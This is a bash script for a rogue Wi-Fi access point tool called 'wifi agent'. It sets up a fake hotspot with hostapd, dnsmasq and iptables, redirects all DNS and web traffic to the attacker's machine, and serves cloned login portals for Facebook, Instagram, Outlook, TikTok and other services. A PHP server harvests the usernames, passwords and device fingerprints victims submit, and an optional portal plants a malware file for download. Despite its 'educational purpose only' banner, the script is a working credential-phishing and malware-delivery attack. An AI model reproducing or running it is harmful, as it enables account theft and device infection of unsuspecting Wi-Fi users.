#!/bin/bash

#
#  Copyright (c) 2022 Barchampas Gerasimos <makindosxx@gmail.com>.
#  wifi agent is a rogue access point.
#
#  wifi agent is free software: you can redistribute it and/or modify
#  it under the terms of the GNU Affero General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  wifi agent is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU Affero General Public License for more details.
#
#  You should have received a copy of the GNU Affero General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#

# Check os for root

check_root() {

if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    { clear; header; }
    echo -e "The program cannot run.\nFor run program in GNU/Linux Operating System,\nGive root privileges and try again. \n"
    exit 1
fi


}




install_packages() {
	

if [[ -f hostapd && -f dnsmasq ]]; then

{ clear; }	

else

{ clear; header; }
	
./packages.sh 	


fi
	
}



pid_kill() {

#kill $(lsof -t -i:53)
	
#kill all pid for hostapd and dnsmasq
	if [[ `pidof hostapd` ]]; then
		killall hostapd > /dev/null 2>&1
	fi
	
	if [[ `pidof dnsmasq` ]]; then
		killall dnsmasq > /dev/null 2>&1
	fi
	
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	
}



# Terminal Colors

RED="$(printf '\033[31m')"  
GREEN="$(printf '\033[32m')"  
ORANGE="$(printf '\033[33m')"  
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  
CYAN="$(printf '\033[36m')"  
WHITE="$(printf '\033[37m')" 
BLACK="$(printf '\033[30m')"
BLACKBG="$(printf '\033[40m')"
RESETFG="$(printf '\e033[0m')"
RESETBG="$(printf '\e[0m\n')"

 

header(){
	
	
	cat <<- EOF

     ${RED}██╗    ██╗██╗███████╗██╗     █████╗  ██████╗ ███████╗███╗   ██╗████████╗
     ${RED}██║    ██║██║██╔════╝██║    ██╔══██╗██╔════╝ ██╔════╝████╗  ██║╚══██╔══╝
     ${RED}██║ █╗ ██║██║█████╗  ██║    ███████║██║  ███╗█████╗  ██╔██╗ ██║   ██║   
     ${RED}██║███╗██║██║██╔══╝  ██║    ██╔══██║██║   ██║██╔══╝  ██║╚██╗██║   ██║   
     ${RED}╚███╔███╔╝██║██║     ██║    ██║  ██║╚██████╔╝███████╗██║ ╚████║   ██║   
      ${RED}╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝ 
            
${BLACKBG}${RED}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
${BLACKBG}${RED}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
${BLACKBG}${RED}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,,,,,,,,,@@@@@@@@@@@@@@@@@@@@@@@@@,,,%@@@
${BLACKBG}${RED}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,,,,,,,@@@,,,,,,,@@@@@@@@@@@@@@@@@@@@@,,,@@@@
${BLACKBG}${RED}@@@,,,,,/%%/,,,,,@@@@@@@@@@@@@@@@,,,,,,,@@@@@@*,,,,,,,@@@@@@@@@@@@@@@@@%,,,**/@@
${BLACKBG}${RED}@@@&@,,,,,,,,,,@@@@@@@@@@@@@@@@@,,,,,,,,,%#,&*,,,,,,,,,@@@@@@@@@@@@@@@,,,,,,,,,@
${BLACKBG}${RED}@@@@@@@,,,,,,@@@@@@@@@@@@@@@@@@@,,,,,,*@@,,,,,@@,,,,,,,@@@@@@@@@@@@@@@@@*,,,,#,@
${BLACKBG}${RED}@@@@@@@@@,,@@@@@@@@@@@@@@@@@@@@@,,,,,/@@@@@@@@@@@,,,,,,@@@@@@@@@@@@@@@@@&,#,,@@@
${BLACKBG}${RED}@@@@@@@@,,,,@@@@@@@@@@@@@@@@@@@@%,,,&@/@@@@@@@@@,@*,,,&@@@@@@@@@@@@@@@@@&,#,,@@@
${BLACKBG}${RED}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,,*@,@@@@@@@@@#@,,,@@@@@@@@@@@@@@@@@@@&,#,,@@@
${BLACKBG}${RED}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*,,,,,,,,,,,,,(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
${BLACKBG}${RED}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
${BLACKBG}${RED}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@${RESETBG}

        ${CYAN}This tool made for educational purpose only.  ${ORANGE}Version: 1.0
        ${CYAN}The author is not responsible for any malicious use of the program.          
        ${CYAN}Created by ${ORANGE}makdosx ${CYAN}(https://github.com/makdosx) ${WHITE} ${RESETBG}                                                                                                         
	EOF
	
}



Fake_Wifi()
{

systemctl stop NetworkManager.service	
	
{ clear; header; echo; }
 	
ethernet=$(ip link | awk -F: '$0 !~ "lo|vir|wl|^[^0-9]"{print $2;getline}')

wifi=$(iw dev | awk '$1=="Interface"{print $2}')

if [ -f /etc/spoof.hosts ]; then mv /etc/spoof.hosts /etc/spoof.BAK; fi

cat <<- EOF
       ${MAGENTA} Give a realistic Wifi SSID
       ${MAGENTA} example: Free Wifi ${ORANGE}or ${MAGENTA}freewifi.com (for view the login portal) 
	EOF
	
	
read -p ${CYAN}"Give WiFi name: "${WHITE} wifi_name

ap_name="$wifi_name"

echo "10.0.0.1 $wifi_name" >>  /etc/spoof.hosts
echo "${CYAN}Wifi ${WHITE}$wifi_name ${CYAN} wait for enable..."
sleep 3
echo ""

}



# Get fingerprints from victims
get_fingers() {
	IP=$(grep -a 'IP:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    Full_Date=$(grep -a 'Full-Date:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    User_Agent=$(grep -a 'User-Agent:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    OS_System=$(grep -a 'OS-System:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} IP: ${WHITE}$IP"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Full Date: ${BLUE}$Full_Date"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} User-Agent: ${BLUE}$User_Agent"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} OS System: ${BLUE}$OS_System"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Saved in : ${ORANGE}fingerprints.txt"
	cat .www/fingerprints.txt >> fingerprints.txt
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Waiting for next Fingerprints ${BLUE}Ctrl + C ${ORANGE}to exit. "
}





# Get credentials from victims
get_creds() {
	Portal=$(grep -a 'Portal:.*' .www/data.txt | cut -d " " -f2 | tr -d '\r')
	IP=$(grep -a 'IP:.*' .www/data.txt | cut -d " " -f2 | tr -d '\r')
    Full_Date=$(grep -a 'Full-Date:.*' .www/data.txt | cut -d " " -f2 | tr -d '\r')
    User_Agent=$(grep -a 'User-Agent:.*' .www/data.txt | cut -d " " -f2 | tr -d '\r')
	ACC=$(grep -o 'Username:.*' .www/data.txt | cut -d " " -f2)
	PASS=$(grep -o 'Password:.*' .www/data.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} IP: ${WHITE}$IP"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Full Date: ${BLUE}$Full_Date"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} User-Agent: ${BLUE}$User_Agent"
	IFS=$'\n'
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Portal : ${WHITE}$Portal"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Account : ${WHITE}$ACC"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Password : ${WHITE}$PASS"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Saved in : ${ORANGE}data.txt"
	cat .www/data.txt >> data.txt
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Waiting for next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}




# Print credentials from victim
credentials() {
	
   echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Waiting for Fingerprints and Login Info.. ${BLUE}Ctrl + C ${MAGENTA}to exit..."
	
	while true; do
	
	
		if [[ -e ".www/fingerprints.txt" ]]; then
			echo -e "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Fingerprints Found !"
			get_fingers
			rm -rf .www/fingerprints.txt
		fi
		
		sleep 0.75
		
		
		
		if [[ -e ".www/data.txt" ]]; then
			echo -e "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Login info Found !"
			get_creds
			rm -rf .www/data.txt
		fi
		
		sleep 0.75
		
	done
}





setup_portal(){
	
    # Setup cloned page and Server
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Setting up portal page..."${WHITE}
	rm -rf .www/*
	cp -rf .portals/"$portal_login"/* .www
	cp -rf google.php .www
	cp -rf google.png .www
	cp -rf navigation.webp .www
	sleep 2
}



# Setup spoof hosts
spoof_hosts()
{

 { clear; header; echo; }

cat <<- EOF

        ${GREEN}${WHITE}${GREEN}${CYAN} 
		${GREEN}[${WHITE}SPOOFING HOSTS${GREEN}]${CYAN} Backing up/Creating spoof.hosts
		${GREEN}[${WHITE}1${GREEN}]${CYAN} Set domain spoofing
		${GREEN}[${WHITE}99${GREEN}]${CYAN} Menu
		
	EOF
	

read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select option : ${WHITE}"${WHITE}


  case $REPLY in 
	    
	    1) 
	      read -p ${CYAN}"Enter Domain e.x www.example.com: "${WHITE} domain
	      echo "${WHITE}$domain ${CYAN}added to spoof file"
	      echo "10.0.0.1 $domain" >>  /etc/spoof.hosts
	      echo ""
	      sleep 2
	      spoof_hosts;;

	    
		99)
           #(( $EUID != 0 )) && { echo "" 1>&2; exit 1; };;
           menu;;

	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; spoof_hosts;};;
	  
	esac

  
}




conected_devices()
{
cat /var/lib/misc/dnsmasq.leases
}



setup_malware()
{
	
 { clear; header; echo; }

cat <<- EOF

		${CYAN}Give malware full path file
		
	EOF
	
	      read -p ${CYAN}"Enter path e.x /home/user/Downloads/malware.apk: "${WHITE} malware_p
	      	      
	      cp -rf $malware_p .www/
	      
          malware_p2=$(basename "$malware_p")
          
          sed -i '/^$malware_d/d' .www/index.php

          sed -i '/define/a $malware_d="'$malware_p2'";' .www/index.php
          
          echo "${WHITE}$malware_p2 ${ORANGE}malware ${CYAN}added to portal login"

	      sleep 2
	      (( $EUID != 0 )) && { echo "" 1>&2; exit 1; }


	
}



portal_menu() {
 
 { clear; header; echo; }

	cat <<- EOF
		${GREEN}[${WHITE}1${GREEN}]${CYAN} Android
		${GREEN}[${WHITE}2${GREEN}]${CYAN} Ios
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Windows
		${GREEN}[${WHITE}4${GREEN}]${CYAN} Gnu/linux
		${GREEN}[${WHITE}5${GREEN}]${CYAN} Facebook
		${GREEN}[${WHITE}6${GREEN}]${CYAN} Facebook Security
		${GREEN}[${WHITE}7${GREEN}]${CYAN} Instagram
		${GREEN}[${WHITE}8${GREEN}]${CYAN} Twitter
		${GREEN}[${WHITE}9${GREEN}]${CYAN} Linkedin
		${GREEN}[${WHITE}10${GREEN}]${CYAN} Outlook
		${GREEN}[${WHITE}11${GREEN}]${CYAN} Tiktok
		${GREEN}[${WHITE}12${GREEN}]${CYAN} Skype
		${GREEN}[${WHITE}13${GREEN}]${CYAN} VK
		${GREEN}[${WHITE}14${GREEN}]${CYAN} Malware
		${GREEN}[${WHITE}99${GREEN}]${ORANGE} Menu
		
		
	EOF
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select Portal : ${WHITE}"${WHITE}

	case $REPLY in 
	    
	    1) 
	        portal_login="android"
	        setup_portal 
	        attack;; 
	    
	    
	    2) 
	        portal_login="ios"
	        setup_portal 
	        attack;; 

        3) 
	        portal_login="windows"
	        setup_portal 
	        attack;; 


        4) 
	        portal_login="gnu_linux"
	        setup_portal 
	        attack;; 
	        
	        
	    5) 
	        portal_login="facebook"
	        setup_portal 
	        attack;;      
	        
	        
	    6) 
	        portal_login="facebook_security"
	        setup_portal 
	        attack;; 
	        
	        
	    7) 
	        portal_login="instagram"
	        setup_portal 
	        attack;; 
	    
	    
	    8) 
	        portal_login="twitter"
	        setup_portal 
	        attack;; 
	    
	    
	    
	    9) 
	        portal_login="linkedin"
	        setup_portal 
	        attack;; 
	    
	    
	    
	    10) 
	        portal_login="outlook"
	        setup_portal 
	        attack;; 
	    
	    
	   
	    11) 
	        portal_login="tiktok"
	        setup_portal 
	        attack;; 
	    
	    
	    
	    12) 
	        portal_login="skype"
	        setup_portal 
	        attack;; 
	    
	    
	    
	    13) 
	        portal_login="vk"
	        setup_portal 
	        attack;; 
	    
	    
	    
	    14) 
	        portal_login="malware"
	        setup_portal
	        setup_malware 
	        attack;; 
	                
	    
		99)
           menu;;
		
	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; portal_menu;};;
	  
	esac
	
}	







menu() {
 
 { clear; header; echo; }

	cat <<- EOF
		${GREEN}[${WHITE}1${GREEN}]${CYAN} Attack
		${GREEN}[${WHITE}2${GREEN}]${CYAN} Spoof Hosts
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Connected Devices 
		${GREEN}[${WHITE}0${GREEN}]${ORANGE} Exit
		
		
	EOF
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in 
	    
	    1) 
	      portal_menu;; 
	      
	    
	    2)
	      spoof_hosts;;
	         
	      
	    3) conected_devices
	       sleep 3
	       menu;;  
	    
		0)
		echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${ORANGE} Thanks for using Wifi Mip "${WHITE}
		sleep 2
		clear
		exit 1;;
		
	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; menu;};;
	  
	esac
	
}	




attack()
{

 { clear; header; echo; }

echo "${CYAN}Waiting for Start Attack..."


# Back up and Creat hostapd.conf file

if [ -f /etc/hostapd/hostapd.conf ]; then mv /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.bak; fi

echo "interface=$wifi" >> /etc/hostapd/hostapd.conf
echo "driver=nl80211" >> /etc/hostapd/hostapd.conf
echo "ssid=$ap_name" >> /etc/hostapd/hostapd.conf
echo "hw_mode=g" >> /etc/hostapd/hostapd.conf
echo "channel=11" >> /etc/hostapd/hostapd.conf
                  
sleep 1


# Back up and Create dnsmasq.conf file

if [ -f /etc/dnsmasq.conf ]; then mv /etc/dnsmasq.conf /etc/dnsmasq.bak; fi

echo "no-resolv" >> /etc/dnsmasq.conf
echo "interface=$wifi" >> /etc/dnsmasq.conf
echo "dhcp-range=10.0.0.2,10.0.0.101,12h" >> /etc/dnsmasq.conf
echo "server=8.8.8.8" >> /etc/dnsmasq.conf
echo "server=8.8.4.4" >> /etc/dnsmasq.conf
echo "domain=free.wifi" >> /etc/dnsmasq.conf
echo "address=/fake.local/10.0.0.1" >>  /etc/dnsmasq.conf
echo "addn-hosts=/etc/spoof.hosts" >>  /etc/dnsmasq.conf
echo "address=/#/10.0.0.1" >> /etc/dnsmasq.conf
sleep 1



# Adding routes to iptables

iptables -t mangle -N captiveportal
iptables -t mangle -A PREROUTING -i $wifi -p udp --dport 53 -j RETURN
iptables -t mangle -A PREROUTING -i $wifi -j captiveportal
iptables -t mangle -A captiveportal -j MARK --set-mark 1
iptables -t nat -A PREROUTING -i $wifi  -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1
xterm -e nohup  sysctl -w net.ipv4.ip_forward=1
iptables -A FORWARD -i $wifi -j ACCEPT
iptables -t nat -A POSTROUTING -o $ethernet -j MASQUERADE


# Configure $wifi

ifconfig $wifi up 10.0.0.1 netmask 255.255.255.0


# Start dnsmasq service

sleep 3

if [ -z "$(ps -e | grep dnsmasq)" ]
  then 
	killall dnsmasq > /dev/null 2>&1
    dnsmasq &
  fi
  
sleep 1


# Start hostapd service
hostapd -B /etc/hostapd/hostapd.conf 1> /dev/null



# Php webserver and port 
host='10.0.0.1'
port='80'

# Start Web Server

cd .www && php -S "$host":"$port" > /dev/null 2>&1 & 


echo -e "${CYAN}For exit press CTRL C"

credentials

while true; do read $wifi; done

}




control_c()
{
  echo -e "${ORANGE}CTRL C \n"
  reset $wifi $ethernet
  exit 1
}


function reset() {
	
	echo -en "\nReset fake Wifi and exit \n"

	# Restore hostapd.conf file
	if [ -f /etc/hostapd/hostapd.bak ]; then mv /etc/hostapd/hostapd.bak /etc/hostapd/hostapd.conf; fi
	sleep 1
	
	# Restore dnsmasq.conf file
	if [ -f /etc/dnsmasq.bak ]; then mv /etc/dnsmasq.bak /etc/dnsmasq.conf; fi
	sleep 1
	
	
    # Restore spoof.hosts file
	if [ -f /etc/spoof.bak ]; then mv /etc/spoof.bak /etc/spoof.hosts; fi
	sleep 1
	

	# Restore iptables
	iptables -t mangle -D PREROUTING -i $wifi -p udp --dport 53 -j RETURN
	iptables -t mangle -D PREROUTING -i $wifi -j captiveportal
	iptables -t mangle -D captiveportal -j MARK --set-mark 1
	iptables -t nat -D PREROUTING -i $wifi  -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1
	iptables -D FORWARD -i $wifi -j ACCEPT
	iptables -t nat -D POSTROUTING -o $ethernet -j MASQUERADE
	iptables -t nat -F
	iptables -t nat -X
	iptables -t mangle -F
	iptables -t mangle -X
	sleep 1
	
	
    systemctl start NetworkManager.service
    sleep 1
    echo -e "${RESETBG}"
    echo -e "${RESETFG}"
    clear
    exit 1
}

trap control_c SIGINT



# Call Functions
check_root
install_packages
pid_kill
Fake_Wifi
menu
